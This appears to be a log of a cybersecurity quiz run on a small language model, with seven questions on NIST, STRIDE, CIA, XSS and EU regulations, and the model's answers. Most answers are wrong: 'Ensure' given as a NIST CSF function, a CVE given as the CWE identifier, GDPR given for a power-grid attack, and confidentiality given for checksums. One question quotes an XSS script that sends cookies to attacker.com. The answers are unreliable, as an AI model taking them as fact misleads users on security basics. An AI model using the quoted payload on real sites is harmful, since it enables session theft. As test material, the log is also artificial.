@@ -1,0 +1,150 @@
+Cybersecurity Sanity Test Log
+Run Mode: gemma3_1b
+Initialized: 2025-07-14T12:04:17.240064
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T12:04:25.494092
+Model: gemma3:1b
+Category: Basic Definitions - Identification
+Response Time: 8.25 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Analyze the following statement: 'The system must enforce multi-factor authentication (MFA) for all administrative access.' In the context of cybersecurity, what type of statement is this and what is its primary purpose?
+
+LLM RESPONSE:
+This statement is a **policy recommendation** and a core component of **security hardening**. Its primary purpose is to **reduce the risk of unauthorized access** to sensitive administrative systems. 
+
+Specifically, it’s a proactive measure to mitigate the potential damage from compromised credentials or insider threats. It’s designed to significantly increase the difficulty of an attack, requiring more than just a password to gain access.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T12:04:32.664990
+Model: gemma3:1b
+Category: Frameworks - Application
+Response Time: 7.17 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A company experiences a ransomware attack. They activate their incident response plan to contain the damage and begin restoring systems from backups. According to the NIST Cybersecurity Framework (CSF), which two core functions are most prominently demonstrated by these actions?
+
+LLM RESPONSE:
+**1. Protect** – Protecting data and systems from unauthorized access and damage.
+2. **Ensure** – Ensuring compliance and continuous improvement in security practices.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T12:04:38.740337
+Model: gemma3:1b
+Category: Security Controls - Identification
+Response Time: 6.07 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A security policy mandates that 'all actions performed by privileged users, including logins and system changes, must be recorded in immutable, time-stamped log files.' Within the NIST SP 800-53 standard, which control family specifically addresses this type of requirement?
+
+LLM RESPONSE:
+NIST SP 800-53.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T12:04:52.411891
+Model: gemma3:1b
+Category: Vulnerabilities - Identification
+Response Time: 13.67 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A web application has a comments section where user input is directly rendered back to the page without being sanitized. An attacker posts a comment containing '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'. What is the common name for this vulnerability and what is its corresponding CWE identifier?
+
+LLM RESPONSE:
+**Vulnerability:** Cross-Site Scripting (XSS)
+
+**CWE Identifier:** CVE-2023-0333 (This is a common example, but there may be others)**
+
+**Explanation:** The attacker is injecting malicious JavaScript code into the comment.  This code attempts to steal cookies and potentially hijack the user’s session.  The specific identifier reflects the specific vulnerability discovered and how it manifests.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T12:04:57.465948
+Model: gemma3:1b
+Category: Threat Modeling - Classification
+Response Time: 5.05 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+During a threat modeling exercise, a team identifies a risk where an unauthorized user could intercept and alter data packets being sent between a client and a server, changing the amount of a financial transaction. Within the STRIDE threat model, which category does this threat belong to?
+
+LLM RESPONSE:
+**Attack**
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T12:05:12.134605
+Model: gemma3:1b
+Category: Regulations/Directives - Application
+Response Time: 14.66 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Consider two security incidents in the EU: 1) A nationwide power grid operator suffers a cyberattack that disrupts electricity distribution. 2) A social media company has a data breach exposing the personal messages of millions of users. Which regulation is the primary concern for incident 1, and which for incident 2?
+
+LLM RESPONSE:
+**For incident 1 (Power Grid):** The primary concern is **Data Protection and Privacy** under GDPR, specifically the right to data protection and the obligation to notify affected individuals. The disruption to electricity distribution means the data is now vulnerable.
+
+**For incident 2 (Social Media):** The primary concern is **Data Protection and Privacy** under GDPR, specifically the right to data privacy and the obligation to notify affected individuals. The exposure of millions of personal messages raises significant privacy concerns.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-14T12:05:18.039978
+Model: gemma3:1b
+Category: Basic Principles - Application
+Response Time: 5.90 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A cloud storage service uses data checksums (like SHA-256 hashes) to verify that files have not been altered or corrupted during upload or download. Which principle of the CIA triad is primarily being upheld by this security control?
+
+LLM RESPONSE:
+**Confidentiality** - Ensuring data is only accessible to authorized users.
+
+--- End of Test Case ---
+==================================================
+
+--- Run Summary ---
+
+Model: gemma3:1b
+  - Total Tests: 7
+  - Total Time Spent in LLM Calls: 60.77 seconds
+  - Average Response Time: 8.68 seconds
+
+Total Number of Test Cases Configured: 7
+
+End of Log.
